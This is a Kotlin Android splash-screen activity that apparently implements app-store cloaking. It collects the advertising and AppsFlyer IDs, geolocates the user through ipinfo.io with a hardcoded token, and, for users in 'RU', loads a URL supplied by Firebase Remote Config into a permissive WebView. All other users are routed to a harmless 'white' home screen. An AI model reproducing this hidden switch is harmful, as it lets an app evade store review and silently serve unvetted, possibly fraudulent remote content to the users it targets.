package com.tester.testarbita




import android.content.Intent
import android.net.Uri
import android.os.*
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.LinearLayout
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.MobileAds
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.google.gson.Gson
import kotlinx.android.synthetic.main.activity_splash.*
import java.io.IOException
import java.lang.Exception
import java.net.URL

var gAID:String? = null
var apsId:String? = null
var urlF:String? = null

class SplashActivity : AppCompatActivity() {
    companion object {
        var fire_clo = "param"
        var fire_default = "pusto"
        var TAG = "SplashActivity"
    }
    private lateinit var goalW: WebView
    var checkBack = true


    var country:String? = null
    var remoteConfig: FirebaseRemoteConfig? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportActionBar?.hide()
        setContentView(R.layout.activity_splash)

        apsId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        MobileAds.initialize(this) {}
        AsyncTask.execute {
            try {
                val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)
                gAID = adInfo?.id
                Log.e("gAID", "$gAID")
            } catch (exception: IOException) {
            } catch (exception: GooglePlayServicesRepairableException) {
            } catch (exception: GooglePlayServicesNotAvailableException) {
            }
        }

        remoteConfig = Firebase.remoteConfig
        remoteConfig!!.setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 0 })
        val defaultValue = HashMap<String, Any>()
        defaultValue[fire_clo] = fire_default
        remoteConfig!!.setDefaultsAsync(defaultValue)

        //start firebase checker
        getURLs()

        //start geo checker
        val thread = Thread {
            try {
                getJSON()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        thread.start()

        Handler().postDelayed({
            if(country == "RU"){
                head()
            }else{
                goWhite()
            }
        },3000)
    }
    private fun getJSON(){
        val apiResponse = URL("https://ipinfo.io/json?token=980d8c96b568c9").readText()
        val gson = Gson()
        val mMineUserEntity = gson.fromJson(apiResponse, MineUserEntity.Data::class.java)
        country = mMineUserEntity.country
        Log.e("country",mMineUserEntity.country)
    }
    private fun head(){
        if(urlF != "pusto" && urlF != null){
            web_main.visibility = View.VISIBLE
            createWebView()
            goalW.loadUrl(urlF.toString())
            Log.e(TAG, "Start: $urlF")
        }else{
            Log.e(TAG, "remote no have")
            goWhite()
        }
    }
    private fun goWhite(){
        startActivity(Intent(this@SplashActivity, HomeActivity::class.java))
        finish()
    }
    private fun getURLs(){
        remoteConfig!!.fetchAndActivate().addOnCompleteListener(this@SplashActivity) { task ->
            if (task.isSuccessful) {
                urlF = remoteConfig!!.getString(fire_clo)
                Log.e(TAG, "urlF:$urlF")
            }
        }
    }
    private fun createWebView() {
        goalW = WebView(this)
        web_main.addView(goalW, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f))

        goalW.settings.javaScriptEnabled = true
        goalW.settings.allowFileAccess = true
        goalW.settings.mixedContentMode = 0
        goalW.settings.setAppCacheEnabled(true)
        goalW.settings.allowFileAccessFromFileURLs = true
        goalW.settings.javaScriptCanOpenWindowsAutomatically = true
        goalW.settings.useWideViewPort = true
        goalW.settings.domStorageEnabled = true
        goalW.settings.databaseEnabled = true
        goalW.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                CookieManager.getInstance().flush()
            }
        }
        goalW.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                mWebView: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                return checkBack
            }
        }
    }
    override fun onBackPressed() {
        when (checkBack) {
            goalW.canGoBack() -> goalW.goBack()
            else -> null
        }
    }
}


